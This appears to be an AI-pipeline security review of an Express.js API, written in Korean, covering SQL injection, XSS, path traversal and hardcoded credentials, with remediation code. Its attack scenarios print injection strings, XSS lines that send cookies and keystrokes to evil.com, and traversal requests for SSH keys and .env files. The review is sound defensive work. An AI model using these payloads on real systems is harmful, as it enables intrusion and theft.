# ✅ 접근법 B: 방법론 학습형 오케스트레이션 (4-Agent Pipeline)

> **대상 코드**: Express.js 기반 REST API 서버  
> **분석 일시**: 2025년 7월  
> **파이프라인**: Planner → Researcher → Reviewer → Implementer  

---

## 📋 Phase 1 — Planner 에이전트 출력

### ADR-001: Express.js API 서버 보안 및 아키텍처 현대화

| 항목 | 내용 |
|------|------|
| **상태** | 제안됨 (Proposed) |
| **의사결정자** | Security Architecture Team |
| **일자** | 2025-07 |
| **관련 RFC** | RFC-SEC-2025-042: API 보안 강화 |

---

### 1.1 컨텍스트 (Context)

현재 시스템은 Express.js 기반의 단일 파일 REST API 서버로, 다음과 같은 구조적 문제를 내포하고 있다:

**C4 Model — Level 1 (System Context) 분석:**

```
┌─────────────┐         ┌─────────────────┐         ┌──────────┐
│  Web Client │ ──HTTP──▶│  Express Server │ ──SQL──▶│  MySQL   │
│  (Browser)  │◀────────│  (Port 3000)    │◀────────│  (myapp) │
└─────────────┘         └─────────────────┘         └──────────┘
                               │
                               ▼
                        ┌──────────────┐
                        │ File System  │
                        │ (/uploads/)  │
                        └──────────────┘
```

**C4 Model — Level 2 (Container) 분석:**

현재 아키텍처에는 다음의 컨테이너 수준 문제가 존재한다:

| 컴포넌트 | 현재 상태 | 위험 수준 |
|----------|----------|----------|
| DB 연결 관리 | 하드코딩된 credentials, 단일 연결 | 🔴 Critical |
| 쿼리 엔진 | 문자열 결합 기반 SQL 생성 | 🔴 Critical |
| 응답 렌더링 | 사용자 입력 직접 HTML 삽입 | 🔴 Critical |
| 파일 서빙 | 경로 검증 없는 파일 접근 | 🔴 Critical |
| 에러 처리 | console.log 기반, 정보 노출 가능 | 🟡 High |
| 보안 미들웨어 | 부재 (CORS, Helmet, Rate Limit 없음) | 🟡 High |

### 1.2 의사결정 (Decision)

다음 사항의 전면 리팩토링을 결정한다:

#### RFC-SEC-2025-042 요구사항 매핑

| RFC 요구사항 | 현재 상태 | 목표 상태 | 우선순위 |
|-------------|----------|----------|---------|
| R1: 인증정보 외부화 | ❌ 하드코딩 | ✅ 환경변수 / Secret Manager | P0 |
| R2: SQL Injection 방어 | ❌ 문자열 결합 | ✅ Parameterized Query | P0 |
| R3: XSS 방어 | ❌ 직접 삽입 | ✅ Output Encoding + CSP | P0 |
| R4: Path Traversal 방어 | ❌ 검증 없음 | ✅ Allowlist + Sandbox | P0 |
| R5: 에러 처리 표준화 | ❌ console.log | ✅ 구조화된 로깅 + 안전한 응답 | P1 |
| R6: 보안 헤더 적용 | ❌ 미적용 | ✅ Helmet.js 적용 | P1 |
| R7: 입력 검증 체계화 | ❌ 없음 | ✅ Schema 기반 검증 (Zod/Joi) | P1 |
| R8: TypeScript 마이그레이션 | ❌ JavaScript | ✅ 엄격 모드 TypeScript | P2 |
| R9: 커넥션 풀링 | ❌ 단일 연결 | ✅ Pool 기반 연결 관리 | P1 |

### 1.3 영향 분석 (Impact Analysis)

```
변경 영향 범위 (Blast Radius):

[하드코딩 제거]
  ├── 배포 파이프라인: .env / Secret 관리 체계 필요
  ├── 로컬 개발: .env.example 파일 제공 필요
  └── CI/CD: 환경변수 주입 설정 필요

[SQL 쿼리 변경]
  ├── DB 드라이버: mysql → mysql2/promise 마이그레이션
  ├── 모든 쿼리: Prepared Statement으로 전환
  └── 에러 처리: Promise/async-await 패턴으로 전환

[XSS 방어]
  ├── 응답 생성: 템플릿 엔진 도입 또는 JSON API 전환
  └── 보안 헤더: Content-Security-Policy 적용

[Path Traversal 방어]
  ├── 파일 서빙: 화이트리스트 + 경로 정규화
  └── 디렉토리: chroot 또는 sandbox 적용
```

### 1.4 구현 계획 (Implementation Plan)

```
Phase 1: Critical Security Fixes (즉시)
  ├── Task 1.1: 하드코딩된 credentials 제거 → 환경변수
  ├── Task 1.2: SQL Injection 수정 → Parameterized Query
  ├── Task 1.3: XSS 수정 → Output Encoding
  └── Task 1.4: Path Traversal 수정 → 경로 검증

Phase 2: Architecture Modernization (1주)
  ├── Task 2.1: TypeScript 전환
  ├── Task 2.2: mysql2/promise 마이그레이션
  ├── Task 2.3: 입력 검증 레이어 (Zod) 추가
  └── Task 2.4: 구조화된 에러 핸들링

Phase 3: Hardening (2주)
  ├── Task 3.1: Helmet.js 보안 헤더
  ├── Task 3.2: Rate Limiting
  ├── Task 3.3: 구조화된 로깅 (Winston/Pino)
  └── Task 3.4: Health Check + Graceful Shutdown
```

### 1.5 리스크 및 완화 전략

| 리스크 | 가능성 | 영향 | 완화 전략 |
|--------|--------|------|----------|
| DB 드라이버 교체 시 호환성 문제 | 중 | 중 | mysql2는 mysql과 API 호환 |
| TypeScript 전환 시 빌드 복잡도 증가 | 중 | 낮 | tsconfig strict 모드 + 점진적 전환 |
| 환경변수 관리 누락으로 배포 실패 | 중 | 높 | 시작 시 필수 변수 검증 로직 |
| 성능 변화 (ORM 도입 시) | 낮 | 중 | Raw query 유지, ORM 미사용 |

---

## 🔬 Phase 2 — Researcher 에이전트 출력

### SLR (Systematic Literature Review) 기반 기술 조사

---

### 2.1 Technology Radar 분석

#### Ring 1: ADOPT (즉시 채택 권장)

| 기술 | 근거 | 성숙도 | 커뮤니티 |
|------|------|--------|---------|
| **mysql2** | mysql 패키지의 현대적 대체. Promise 네이티브 지원, Prepared Statement 기본 | ⭐⭐⭐⭐⭐ | npm weekly: ~2.5M |
| **helmet.js** | Express 보안 헤더 표준 미들웨어 | ⭐⭐⭐⭐⭐ | npm weekly: ~1.2M |
| **dotenv** | 12-Factor App Config 표준 구현 | ⭐⭐⭐⭐⭐ | npm weekly: ~35M |
| **zod** | TypeScript-first 스키마 검증. 런타임 타입 안전성 보장 | ⭐⭐⭐⭐⭐ | npm weekly: ~15M |
| **express-rate-limit** | DoS/Brute-force 방어 표준 | ⭐⭐⭐⭐⭐ | npm weekly: ~700K |

#### Ring 2: TRIAL (시범 적용 고려)

| 기술 | 근거 | 성숙도 |
|------|------|--------|
| **Prisma** | Type-safe ORM, 스키마 기반 마이그레이션 | ⭐⭐⭐⭐ |
| **Fastify** | Express 대비 2-3배 성능, 스키마 기반 검증 내장 | ⭐⭐⭐⭐ |
| **pino** | 구조화 로깅, 고성능 (JSON 네이티브) | ⭐⭐⭐⭐ |

#### Ring 3: ASSESS (평가 단계)

| 기술 | 근거 |
|------|------|
| **tRPC** | End-to-end type-safe API, 풀스택 TypeScript 프로젝트에 적합 |
| **Hono** | 경량 웹 프레임워크, Edge Runtime 호환 |

#### Ring 4: HOLD (보류/퇴출 대상)

| 기술 | 사유 |
|------|------|
| **mysql (mysqljs)** | ❌ Promise 미지원, Prepared Statement 불편, 유지보수 저조 |
| **문자열 결합 쿼리** | ❌ SQL Injection 직접 원인 |
| **callback 패턴** | ❌ 에러 처리 누락 위험, 가독성 저하 |

---

### 2.2 비교 분석: DB 드라이버 선택

#### mysql vs mysql2 vs Prisma 상세 비교

| 평가 기준 | mysql (mysqljs) | mysql2 | Prisma |
|----------|----------------|--------|--------|
| **Promise 지원** | ❌ Callback만 | ✅ 네이티브 | ✅ 네이티브 |
| **Prepared Statement** | 부분적 (`?` 플레이스홀더) | ✅ 서버 사이드 PS | ✅ 자동 |
| **TypeScript 지원** | ❌ @types 별도 필요 | ✅ 내장 타입 | ✅ 생성된 타입 |
| **Connection Pool** | ✅ | ✅ (더 효율적) | ✅ (내장) |
| **성능** | 기준선 | 기준 대비 +10~30% | 기준 대비 -5~15% (추상화 비용) |
| **번들 크기** | 433KB | 430KB | ~8MB (엔진 포함) |
| **npm 주간 다운로드** | ~1.2M | ~2.5M | ~2.1M |
| **마지막 업데이트** | 비활발 | 활발 | 매우 활발 |
| **학습 곡선** | 낮음 | 낮음 (API 호환) | 중간 (스키마 학습 필요) |
| **마이그레이션 비용** | - | 매우 낮음 | 높음 |
| **SQL Injection 방어** | 수동 | 자동 (PS 사용 시) | 자동 |

#### 🏆 권장사항

```
현재 프로젝트 규모 및 마이그레이션 비용 고려 시:

1순위: mysql2/promise
  - 이유: mysql과 API 호환, 마이그레이션 비용 최소
  - Prepared Statement 서버 사이드 지원
  - async/await 네이티브

2순위: Prisma (향후 고려)
  - 이유: 프로젝트 규모 성장 시 Type-safe 쿼리 필요
  - 스키마 기반 마이그레이션 관리 이점
  - 단, 현 단계에서는 오버엔지니어링
```

---

### 2.3 비교 분석: Callback vs Async/Await

```javascript
// ❌ BEFORE: Callback 패턴 — 에러 처리 누락 가능성
db.query(query, (err, results) => {
  if (err) {           // 개발자가 err 체크를 잊으면?
    console.log(err);  // 정보 노출
    res.status(500).send('Error');
    return;            // return 누락 시 이후 코드 실행
  }
  res.json(results);
});

// ✅ AFTER: Async/Await — 구조적으로 에러 처리 강제
try {
  const [rows] = await db.execute('SELECT * FROM users WHERE name = ?', [name]);
  res.json(rows);
} catch (error) {
  // 에러가 catch로 자동 전파 — 누락 불가능
  logger.error('Database query failed', { error: sanitizeError(error) });
  res.status(500).json({ error: 'Internal server error' });
}
```

**비교 분석 결과:**

| 측면 | Callback | Async/Await |
|------|----------|-------------|
| 에러 처리 안전성 | 낮음 (수동 체크) | 높음 (자동 전파) |
| 코드 가독성 | 낮음 (중첩) | 높음 (선형) |
| 디버깅 용이성 | 낮음 (스택 유실) | 높음 (완전한 스택) |
| 테스트 용이성 | 낮음 | 높음 |
| 메모리 누수 위험 | 높음 (응답 미전송 시) | 낮음 |

---

### 2.4 입력 검증 라이브러리 비교

| 기준 | Joi | Yup | Zod | class-validator |
|------|-----|-----|-----|-----------------|
| TypeScript 네이티브 | ❌ | 부분 | ✅ | ✅ |
| 번들 크기 | 148KB | 40KB | 13KB | 70KB |
| 타입 추론 | 없음 | 없음 | ✅ 자동 | 데코레이터 |
| 생태계 호환성 | Express 전통 | React 중심 | 범용 | NestJS |
| 런타임 성능 | 양호 | 양호 | 우수 | 양호 |

**선택: Zod** — TypeScript-first, 최소 번들, 자동 타입 추론

---

### 2.5 보안 참조 자료 (Evidence Base)

| 출처 | 관련 내용 | 참조 |
|------|----------|------|
| OWASP Top 10 (2021) | A03: Injection, A07: XSS | owasp.org/Top10 |
| CWE/SANS Top 25 (2023) | CWE-89, CWE-79, CWE-22 | cwe.mitre.org |
| Node.js Security Checklist | 입력 검증, 의존성 관리 | nodejs.org/docs/guides |
| Express.js Security Best Practices | Helmet, Rate Limit | expressjs.com/advanced |
| 12-Factor App | Config, Logs, Disposability | 12factor.net |
| NIST SP 800-53 | SI-10 (Input Validation) | nist.gov |

---

## 🛡️ Phase 3 — Reviewer 에이전트 출력

### OWASP Top 10 / SANS CWE Top 25 / CVSS 기반 보안 심층 분석

---

### 취약점 #1: SQL Injection

| 항목 | 상세 |
|------|------|
| **CWE** | CWE-89: Improper Neutralization of Special Elements used in an SQL Command |
| **OWASP** | A03:2021 — Injection |
| **SANS Top 25 순위** | #3 |
| **위치** | `app.get('/users', ...)` — Line 15-16 |
| **심각도** | 🔴 **Critical** |

#### CVSS v3.1 점수

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
┌────────────────────────────────────────────┐
│  Base Score: 10.0 (Critical)               │
├────────────────────────────────────────────┤
│  Attack Vector (AV):        Network (N)    │  ← 원격 공격 가능
│  Attack Complexity (AC):    Low (L)        │  ← 특별한 조건 불필요
│  Privileges Required (PR):  None (N)       │  ← 인증 불필요
│  User Interaction (UI):     None (N)       │  ← 사용자 상호작용 불필요
│  Scope (S):                 Changed (C)    │  ← DB 서버까지 영향
│  Confidentiality (C):       High (H)       │  ← 전체 DB 데이터 노출
│  Integrity (I):             High (H)       │  ← 데이터 변조 가능
│  Availability (A):          High (H)       │  ← DB 삭제 가능
└────────────────────────────────────────────┘
```

#### 공격 시나리오

```
1단계: 정보 수집 (Reconnaissance)
  공격자 요청: GET /users?name=' OR '1'='1' --
  생성되는 SQL: SELECT * FROM users WHERE name = '' OR '1'='1' --'
  결과: 전체 users 테이블 덤프

2단계: 데이터베이스 구조 파악
  공격자 요청: GET /users?name=' UNION SELECT table_name,null,null FROM information_schema.tables --
  결과: 모든 테이블 이름 노출

3단계: 크리덴셜 탈취
  공격자 요청: GET /users?name=' UNION SELECT username,password,null FROM admin_users --
  결과: 관리자 계정 정보 탈취

4단계: 데이터 파괴
  공격자 요청: GET /users?name='; DROP TABLE users; --
  결과: users 테이블 완전 삭제

5단계: OS 명령 실행 (MySQL FILE 권한 있는 경우)
  공격자 요청: GET /users?name=' UNION SELECT LOAD_FILE('/etc/passwd'),null,null --
  결과: 서버 시스템 파일 읽기
```

#### 취약 코드

```javascript
// ❌ 문자열 결합으로 SQL 쿼리 생성 — CWE-89 직접 원인
const query = "SELECT * FROM users WHERE name = '" + name + "'";
```

#### 수정 코드

```typescript
// ✅ Parameterized Query (Prepared Statement)
const [rows] = await db.execute(
  'SELECT id, name, email FROM users WHERE name = ?',
  [name]
);
// '?' 플레이스홀더는 DB 드라이버가 안전하게 이스케이프
// SELECT * 대신 필요한 컬럼만 명시 (정보 최소화 원칙)
```

---

### 취약점 #2: Reflected Cross-Site Scripting (XSS)

| 항목 | 상세 |
|------|------|
| **CWE** | CWE-79: Improper Neutralization of Input During Web Page Generation |
| **OWASP** | A03:2021 — Injection (XSS는 2021부터 Injection 카테고리에 통합) |
| **SANS Top 25 순위** | #2 |
| **위치** | `app.get('/search', ...)` — Line 27-29 |
| **심각도** | 🔴 **High** |

#### CVSS v3.1 점수

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N
┌────────────────────────────────────────────┐
│  Base Score: 8.2 (High)                    │
├────────────────────────────────────────────┤
│  Attack Vector (AV):        Network (N)    │  ← 원격 공격 가능
│  Attack Complexity (AC):    Low (L)        │  ← 단순한 페이로드
│  Privileges Required (PR):  None (N)       │  ← 인증 불필요
│  User Interaction (UI):     Required (R)   │  ← 피해자가 링크 클릭 필요
│  Scope (S):                 Changed (C)    │  ← 피해자 브라우저에서 실행
│  Confidentiality (C):       High (H)       │  ← 세션/쿠키 탈취 가능
│  Integrity (I):             Low (L)        │  ← 페이지 변조 가능
│  Availability (A):          None (N)       │  ← 가용성 영향 미미
└────────────────────────────────────────────┘
```

#### 공격 시나리오

```
1단계: 세션 하이재킹
  공격 URL: /search?q=<script>fetch('https://evil.com/steal?c='+document.cookie)</script>
  결과: 피해자의 세션 쿠키가 공격자 서버로 전송

2단계: 피싱 (Phishing)
  공격 URL: /search?q=<div style="position:fixed;top:0;left:0;width:100%;height:100%;
  background:white;z-index:9999"><h1>세션 만료</h1><form action="https://evil.com/phish">
  <input name="user" placeholder="아이디"><input name="pass" type="password" 
  placeholder="비밀번호"><button>로그인</button></form></div>
  결과: 신뢰할 수 있는 도메인에서 가짜 로그인 폼 표시

3단계: 키로거 주입
  공격 URL: /search?q=<script>document.onkeypress=function(e){
  fetch('https://evil.com/log?k='+e.key)}</script>
  결과: 이후 피해자의 모든 키 입력이 기록됨

4단계: 크립토마이너 주입
  공격 URL: /search?q=<script src="https://evil.com/miner.js"></script>
  결과: 피해자 브라우저에서 암호화폐 채굴
```

#### 취약 코드

```javascript
// ❌ 사용자 입력을 HTML에 직접 삽입 — CWE-79 직접 원인
res.send(`<h1>검색 결과: ${keyword}</h1>`);
```

#### 수정 코드

```typescript
// ✅ 방법 1: JSON API로 전환 (권장 — API 서버라면)
res.json({ query: keyword, results: [] });

// ✅ 방법 2: HTML 출력이 반드시 필요한 경우 — Output Encoding
import { encode } from 'he'; // HTML entity encoder
res.send(`<h1>검색 결과: ${encode(keyword)}</h1>`);

// ✅ 방법 3: Content-Security-Policy 헤더 추가 (심층 방어)
// helmet.js가 자동으로 처리
```

---

### 취약점 #3: Path Traversal (Directory Traversal)

| 항목 | 상세 |
|------|------|
| **CWE** | CWE-22: Improper Limitation of a Pathname to a Restricted Directory |
| **OWASP** | A01:2021 — Broken Access Control |
| **SANS Top 25 순위** | #8 |
| **위치** | `app.get('/file', ...)` — Line 32-34 |
| **심각도** | 🔴 **Critical** |

#### CVSS v3.1 점수

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
┌────────────────────────────────────────────┐
│  Base Score: 7.5 (High)                    │
├────────────────────────────────────────────┤
│  Attack Vector (AV):        Network (N)    │  ← 원격 접근 가능
│  Attack Complexity (AC):    Low (L)        │  ← 단순 경로 조작
│  Privileges Required (PR):  None (N)       │  ← 인증 불필요
│  User Interaction (UI):     None (N)       │  ← 자동 공격 가능
│  Scope (S):                 Unchanged (U)  │  ← 서버 내 영향
│  Confidentiality (C):       High (H)       │  ← 민감 파일 읽기
│  Integrity (I):             None (N)       │  ← 읽기 전용
│  Availability (A):          None (N)       │  ← 가용성 영향 없음
└────────────────────────────────────────────┘
```

#### 공격 시나리오

```
1단계: 시스템 파일 읽기
  공격자 요청: GET /file?name=../../../etc/passwd
  실제 경로: /uploads/../../../etc/passwd → /etc/passwd
  결과: 서버 사용자 목록 노출

2단계: 애플리케이션 소스코드 탈취
  공격자 요청: GET /file?name=../../../app/server.js
  결과: 서버 소스코드 노출 (DB credentials 포함!)

3단계: SSH 키 탈취
  공격자 요청: GET /file?name=../../../root/.ssh/id_rsa
  결과: 서버 SSH 개인키 탈취 → 서버 완전 장악

4단계: 환경변수 파일 탈취
  공격자 요청: GET /file?name=../../../app/.env
  결과: 모든 비밀 정보 (API 키, DB 비밀번호 등) 노출

5단계: 인코딩 우회
  공격자 요청: GET /file?name=..%2F..%2F..%2Fetc%2Fpasswd   (URL 인코딩)
  공격자 요청: GET /file?name=....//....//....//etc/passwd   (이중 점 우회)
  공격자 요청: GET /file?name=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

#### 취약 코드

```javascript
// ❌ 경로 검증 없이 파일 시스템 접근 — CWE-22 직접 원인
res.sendFile('/uploads/' + filename);
```

#### 수정 코드

```typescript
// ✅ 다중 방어 레이어 적용
import path from 'path';

const UPLOADS_DIR = path.resolve(process.cwd(), 'uploads');

app.get('/file', (req, res) => {
  const filename = req.query.name;
  
  // Layer 1: 입력 검증 — 파일명에 경로 구분자 금지
  if (!filename || /[\/\\]/.test(filename) || filename.includes('..')) {
    return res.status(400).json({ error: 'Invalid filename' });
  }
  
  // Layer 2: 허용 확장자 화이트리스트
  const allowedExtensions = ['.jpg', '.jpeg', '.png', '.gif', '.pdf'];
  const ext = path.extname(filename).toLowerCase();
  if (!allowedExtensions.includes(ext)) {
    return res.status(400).json({ error: 'File type not allowed' });
  }
  
  // Layer 3: 경로 정규화 후 디렉토리 이탈 검증
  const resolvedPath = path.resolve(UPLOADS_DIR, filename);
  if (!resolvedPath.startsWith(UPLOADS_DIR)) {
    return res.status(403).json({ error: 'Access denied' });
  }
  
  // Layer 4: root 옵션으로 sendFile 제한
  res.sendFile(filename, { root: UPLOADS_DIR });
});
```

---

### 취약점 #4: 하드코딩된 자격증명 (Hardcoded Credentials)

| 항목 | 상세 |
|------|------|
| **CWE** | CWE-798: Use of Hard-coded Credentials |
| **OWASP** | A07:2021 — Identification and Authentication Failures |
| **SANS Top 25 순위** | #18 |
| **위치** | DB 연결 설정 — Line 7-12 |
| **심각도** | 🔴 **Critical** |

#### CVSS v3.1 점수

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
┌────────────────────────────────────────────┐
│  Base Score: 10.0 (Critical)               │
├────────────────────────────────────────────┤
│  Attack Vector (AV):        Network (N)    │  ← 소스코드 접근 시 즉시 악용
│  Attack Complexity (AC):    Low (L)        │  ← 평문 비밀번호
│  Privileges Required (PR):  None (N)       │  ← 소스 접근만으로 충분
│  User Interaction (UI):     None (N)       │  ← 자동 악용 가능
│  Scope (S):                 Changed (C)    │  ← DB 서버 완전 장악
│  Confidentiality (C):       High (H)       │  ← 전체 DB 접근
│  Integrity (I):             High (H)       │  ← DB 변조 가능
│  Availability (A):          High (H)       │  ← DB 삭제 가능
└────────────────────────────────────────────┘
```

#### 공격 시나리오

```
시나리오 A: 소스코드 유출 경로
  1. Git 저장소가 공개 설정 (또는 .git 디렉토리 노출)
  2. 공격자가 소스코드에서 root/password123 발견
  3. MySQL 포트(3306)가 열려있다면 직접 접속
  4. 전체 데이터베이스 장악

시나리오 B: Path Traversal과 연계
  1. /file?name=../../../app/server.js 로 소스코드 읽기
  2. 하드코딩된 credentials 발견
  3. 동일한 비밀번호가 다른 서비스에도 사용될 가능성 (Credential Stuffing)

추가 위험:
  - user: 'root' — 최소 권한 원칙 위반 (CWE-250)
  - password: 'password123' — 약한 비밀번호 (CWE-521)
  - Git 히스토리에 비밀번호 영구 기록
```

#### 취약 코드

```javascript
// ❌ 하드코딩된 자격증명 — CWE-798
const db = mysql.createConnection({
  host: 'localhost',
  user: 'root',         // 최소 권한 원칙 위반
  password: 'password123', // 평문 비밀번호 노출
  database: 'myapp'
});
```

#### 수정 코드

```typescript
// ✅ 환경변수 기반 설정 (12-Factor App — Factor III: Config)
import { z } from 'zod';

const envSchema = z.object({
  DB_HOST: z.string().min(1),
  DB_PORT: z.coerce.number().default(3306),
  DB_USER: z.string().min(1),
  DB_PASSWORD: z.string().min(1),
  DB_NAME: z.string().min(1),
  NODE_ENV: z.enum(['development', 'production', 'test']).default('development'),
  PORT: z.coerce.number().default(3000),
});

// 시작 시 환경변수 검증 — 누락 시 즉시 실패 (Fail Fast)
const env = envSchema.parse(process.env);

const pool = mysql.createPool({
  host: env.DB_HOST,
  port: env.DB_PORT,
  user: env.DB_USER,        // 전용 제한된 계정 사용
  password: env.DB_PASSWORD, // Secret Manager에서 주입
  database: env.DB_NAME,
  waitForConnections: true,
  connectionLimit: 10,
  queueLimit: 0,
});
```

---

### 취약점 #5: 부적절한 에러 처리 및 정보 노출

| 항목 | 상세 |
|------|------|
| **CWE** | CWE-209: Generation of Error Message Containing Sensitive Information |
| **OWASP** | A09:2021 — Security Logging and Monitoring Failures |
| **위치** | `console.log(err)` — Line 18 |
| **심각도** | 🟡 **Medium** |

#### CVSS v3.1 점수

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
┌────────────────────────────────────────────┐
│  Base Score: 5.3 (Medium)                  │
├────────────────────────────────────────────┤
│  공격자가 의도적으로 에러를 유발하여       │
│  DB 구조, 테이블명, 컬럼명 등 수집 가능    │
└────────────────────────────────────────────┘
```

#### 문제점

```javascript
// ❌ console.log는 프로덕션 로깅에 부적합
// ❌ 에러 객체에 민감 정보 포함 가능 (쿼리문, DB 구조 등)
// ❌ 구조화되지 않은 로그 — 모니터링/알림 연계 불가
// ❌ 'Error' 문자열만 반환 — 클라이언트 디버깅 불가능하나
//    동시에 에러 타입 구분도 불가
console.log(err);
res.status(500).send('Error');
```

---

### 취약점 #6: 보안 헤더 부재

| 항목 | 상세 |
|------|------|
| **CWE** | CWE-693: Protection Mechanism Failure |
| **OWASP** | A05:2021 — Security Misconfiguration |
| **심각도** | 🟡 **Medium** |

#### 누락된 보안 헤더 목록

| 헤더 | 용도 | 부재 시 위험 |
|------|------|-------------|
| `X-Content-Type-Options: nosniff` | MIME 스니핑 방지 | 파일 업로드 공격 |
| `X-Frame-Options: DENY` | 클릭재킹 방지 | UI Redressing 공격 |
| `Content-Security-Policy` | XSS 심층 방어 | 인라인 스크립트 실행 |
| `Strict-Transport-Security` | HTTPS 강제 | 중간자 공격 |
| `X-XSS-Protection: 0` | 구형 브라우저 XSS 필터 | 오동작 방지 |
| `Referrer-Policy` | Referer 헤더 제어 | 정보 유출 |

---

### 취약점 #7: Rate Limiting 부재

| 항목 | 상세 |
|------|------|
| **CWE** | CWE-770: Allocation of Resources Without Limits |
| **OWASP** | A04:2021 — Insecure Design |
| **심각도** | 🟡 **Medium** |

#### CVSS v3.1 점수

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
Base Score: 7.5 (High — 가용성 관점)
```

#### 공격 시나리오

```
Brute Force / DoS 공격:
  - 초당 수천 건의 /users 요청 → DB 과부하
  - 대량 /search 요청 → 서버 리소스 고갈
  - 자동화된 /file 요청 → 파일시스템 I/O 고갈
```

---

### 취약점 #8: SELECT * 사용 — 과도한 데이터 노출

| 항목 | 상세 |
|------|------|
| **CWE** | CWE-200: Exposure of Sensitive Information to an Unauthorized Actor |
| **OWASP** | A01:2021 — Broken Access Control |
| **위치** | `SELECT * FROM users` — Line 16 |
| **심각도** | 🟡 **Medium** |

```
SELECT *는 다음을 노출할 수 있음:
  - password_hash, salt
  - email, phone_number
  - social_security_number
  - internal_flags, admin_level
  - created_at, last_login_ip
```

---

### 🔎 전체 취약점 요약 매트릭스

| # | 취약점 | CWE | OWASP | CVSS | 심각도 |
|---|--------|-----|-------|------|--------|
| 1 | SQL Injection | CWE-89 | A03:2021 | 10.0 | 🔴 Critical |
| 2 | Reflected XSS | CWE-79 | A03:2021 | 8.2 | 🔴 High |
| 3 | Path Traversal | CWE-22 | A01:2021 | 7.5 | 🔴 High |
| 4 | Hardcoded Credentials | CWE-798 | A07:2021 | 10.0 | 🔴 Critical |
| 5 | 정보 노출 (에러) | CWE-209 | A09:2021 | 5.3 | 🟡 Medium |
| 6 | 보안 헤더 부재 | CWE-693 | A05:2021 | 5.0 | 🟡 Medium |
| 7 | Rate Limiting 부재 | CWE-770 | A04:2021 | 7.5 | 🟡 Medium |
| 8 | 과도한 데이터 노출 | CWE-200 | A01:2021 | 5.0 | 🟡 Medium |

---

## 🛠️ Phase 4 — Implementer 에이전트 출력

### Clean Code / SOLID / 12-Factor / Defensive Programming 적용

---

### 4.1 프로젝트 구조

```
src/
├── index.ts              # 앱 진입점 (12-Factor: Port Binding)
├── config/
│   └── env.ts            # 환경변수 검증 (12-Factor: Config)
├── middleware/
│   ├── security.ts       # 보안 미들웨어 (Helmet, CORS, Rate Limit)
│   ├── errorHandler.ts   # 전역 에러 핸들러 (CWE-209 방어)
│   └── validator.ts      # 입력 검증 미들웨어
├── routes/
│   ├── users.ts          # /users 라우트
│   ├── search.ts         # /search 라우트
│   └── files.ts          # /file 라우트
├── database/
│   └── pool.ts           # DB 커넥션 풀 (SRP)
├── utils/
│   └── logger.ts         # 구조화 로깅 (12-Factor: Logs)
└── types/
    └── index.ts          # 공유 타입 정의
```

---

### 4.2 전체 구현 코드

#### `src/config/env.ts` — 환경변수 검증 (12-Factor: Factor III)

```typescript
import { z } from 'zod';
import dotenv from 'dotenv';

dotenv.config();

const envSchema = z.object({
  // 서버 설정
  NODE_ENV: z.enum(['development', 'production', 'test']).default('development'),
  PORT: z.coerce.number().int().positive().default(3000),

  // 데이터베이스 설정 (CWE-798 방어: 하드코딩 제거)
  DB_HOST: z.string().min(1, 'DB_HOST is required'),
  DB_PORT: z.coerce.number().int().positive().default(3306),
  DB_USER: z.string().min(1, 'DB_USER is required'),
  DB_PASSWORD: z.string().min(1, 'DB_PASSWORD is required'),
  DB_NAME: z.string().min(1, 'DB_NAME is required'),
  DB_CONNECTION_LIMIT: z.coerce.number().int().positive().default(10),

  // 보안 설정
  CORS_ORIGIN: z.string().default('http://localhost:3000'),
  RATE_LIMIT_WINDOW_MS: z.coerce.number().default(15 * 60 * 1000),
  RATE_LIMIT_MAX: z.coerce.number().default(100),

  // 파일 업로드
  UPLOADS_DIR: z.string().default('./uploads'),
});

export type Env = z.infer<typeof envSchema>;

function validateEnv(): Env {
  const result = envSchema.safeParse(process.env);

  if (!result.success) {
    console.error('❌ Environment validation failed:');
    console.error(result.error.format());
    process.exit(1); // Fail Fast — 잘못된 설정으로 실행하지 않음
  }

  return result.data;
}

export const env = validateEnv();
```

#### `src/utils/logger.ts` — 구조화 로깅 (12-Factor: Factor XI)

```typescript
import { env } from '../config/env';

export enum LogLevel {
  ERROR = 'error',
  WARN = 'warn',
  INFO = 'info',
  DEBUG = 'debug',
}

interface LogEntry {
  timestamp: string;
  level: LogLevel;
  message: string;
  context?: Record<string, unknown>;
}

function formatLog(entry: LogEntry): string {
  return JSON.stringify(entry);
}

function sanitizeError(error: unknown): Record<string, unknown> {
  if (error instanceof Error) {
    return {
      name: error.name,
      message: error.message,
      // 프로덕션에서는 스택 트레이스를 클라이언트에 노출하지 않음
      ...(env.NODE_ENV !== 'production' && { stack: error.stack }),
    };
  }
  return { raw: String(error) };
}

export const logger = {
  error(message: string, context?: Record<string, unknown>): void {
    const entry: LogEntry = {
      timestamp: new Date().toISOString(),
      level: LogLevel.ERROR,
      message,
      context,
    };
    // 12-Factor: 로그를 stdout으로 출력 (로그 라우팅은 실행 환경 책임)
    process.stderr.write(formatLog(entry) + '\n');
  },

  warn(message: string, context?: Record<string, unknown>): void {
    const entry: LogEntry = {
      timestamp: new Date().toISOString(),
      level: LogLevel.WARN,
      message,
      context,
    };
    process.stdout.write(formatLog(entry) + '\n');
  },

  info(message: string, context?: Record<string, unknown>): void {
    const entry: LogEntry = {
      timestamp: new Date().toISOString(),
      level: LogLevel.INFO,
      message,
      context,
    };
    process.stdout.write(formatLog(entry) + '\n');
  },

  debug(message: string, context?: Record<string, unknown>): void {
    if (env.NODE_ENV === 'production') return;
    const entry: LogEntry = {
      timestamp: new Date().toISOString(),
      level: LogLevel.DEBUG,
      message,
      context,
    };
    process.stdout.write(formatLog(entry) + '\n');
  },

  sanitizeError,
};
```

#### `src/database/pool.ts` — DB 커넥션 풀 (SRP, DIP)

```typescript
import mysql, { Pool, PoolConnection, RowDataPacket } from 'mysql2/promise';
import { env } from '../config/env';
import { logger } from '../utils/logger';

// 커넥션 풀 생성 — 단일 연결 대신 풀 사용 (성능 + 안정성)
const pool: Pool = mysql.createPool({
  host: env.DB_HOST,
  port: env.DB_PORT,
  user: env.DB_USER,
  password: env.DB_PASSWORD,
  database: env.DB_NAME,
  waitForConnections: true,
